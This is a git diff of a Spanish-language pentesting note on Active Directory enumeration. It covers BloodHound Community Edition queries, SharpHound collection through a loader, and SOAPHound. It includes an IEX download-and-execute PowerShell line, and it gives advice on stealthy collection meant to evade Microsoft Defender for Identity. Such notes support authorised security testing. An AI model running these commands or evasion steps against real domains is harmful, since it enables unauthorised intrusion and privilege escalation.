@@ -1,6 +1,6 @@
 # Bloodhound Community NEW VERSION
 
-Tags: #AD #BloodHound #SharpHound #Kali #Parrot 
+Tags: #AD #BloodHound #SharpHound #Kali #Parrot #SOAPHound 
 
 **BloodHound** es una herramienta especializada en analizar y mapear relaciones dentro de Active Directory (AD). Su capacidad para identificar rutas de ataque y relaciones complejas la ha convertido en una herramienta esencial tanto para pentesters como para atacantes. A través de la recopilación y visualización de datos, permite descubrir configuraciones inseguras, privilegios excesivos y posibles vectores de escalación de privilegios o movimiento lateral en entornos AD, lo que la hace invaluable en auditorías de seguridad y pruebas de penetración.
 
@@ -52,7 +52,7 @@ Los 'ActiveDirectoryRights' incluyen, pero no se limitan a:
 8. GetChangesAll: Es un permiso en Active Directory que permite replicar todos los datos, incluso contraseñas; es clave para ataques como 'DCSync'.
 ```
 
-## BloodHound Community
+## BloodHound Community Edition 
 
 * [Bloodhound-Community-Install](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)
 
@@ -69,20 +69,20 @@ Notas:
 ```
 
 ```bash  
-Enumerar lo siguiente en BloodHound:
+Enumerar lo siguiente en BloodHound usando la pestaña de 'CYPHER':
+	1. 'All Domain Admins'
+	2. 'Map domains trusts'
+	3. 'Principal with DCSync privileges'
+	4. 'All Kerberoastable users'
+	5. 'AS-REP Roastable users (DontReqPreAuth)'
+	6. 'Shortest paths to Domain Admins'
+	7. 'Unsconstrained Delegation'
 
-	1. Identificación de 'Doman Admins'
-	2. Identificación de 'usuarios Kerberoasteables'
-	3. Identificación de 'usuarios AS-REP Roastable'
-	4. Identificación de vectores de ataque 'Find Shortest Paths to Domain Admins'
-	5. Identificación de 'Unsconstrained Delegation'
 
 Una vez obtenido un usuario:
-1. Agregar la opción 'Mark User as Owned'
-	1. Seleccionar el usuario y dar click en 'Outbound Object Control' para ver los derechos que tiene el usuario (Puede tener derechos sobre otros usuarios)
-
-2. Utilizar 'CYPHER'
-	1. En 'Shortest Path' seleccionar 'Shortest Path to Domain Admins' y finalizar con 'Run' para ejecutarlo
+	1. Agregar la opción 'Mark User as Owned'
+		- Seleccionar el usuario y dar click en 'Inbound Object Control' para mostrar quien tiene control sobre el objeto seleccionado 
+		- Seleccionar el usuario y dar click en 'Outbound Object Control' para mostrar sobre que objetos tiene control el usuario comprometido 
 ```
 
 ## BloodHound-Python Recolector
@@ -113,6 +113,33 @@ Notas:
 ❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/SharpHound.ps1') 
 
 ❯ Invoke-BloodHound -CollectionMethod All      # Recolectar la data 
+
+# Suministrar datos a BloodHound 
+❯ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SharpHound.exe -args --collectionmethods All   
+
+# Para hacer una recolección sigilosa, remover métodos ruidosos de recolección como RDP,DCOM, PSRemote y LocalAdmin
+❯ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SharpHound.exe -args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs 
+
+Notas:
+	1. Usar 'Excludedcs' para evitar la detección MDI
+	2. Remover 'CertServices collection' cuando se use BloodHound Legacy 
+```
+
+## SOAPHound 
+
+* [SOAPHound](https://github.com/FalconForceTeam/SOAPHound)
+
+```powershell 
+SOAPHound es más sigiloso. El se comunica con Active Directory Web Services (ADWS - Puerto 9389) en l;ugar de enviar peticiones LDAP como lo haría el AD Module
+	- Casi ninguna detección basada en la red  (MDI)
+	- Recupera info sobre todos los objetos (objectGuid=*) y sus procesos. Esos significa peticiones limitadas a LDAP - Menos posobilidad de detección en puntos finales 
+
+
+# Construir un cache que contiene info básica de los objetos de dominio  
+❯ SOAPHound.exe --buildcache -c C:\AD\Tools\cache.txt   
+
+# Recolectar data compatible con BloodHound 
+❯ SOAPHound.exe -c C:\AD\Tools\cache.txt --bhdump -o C:\AD\Tools\bloodhound-output --nolaps  
 ```
 
 ## ADPeas 
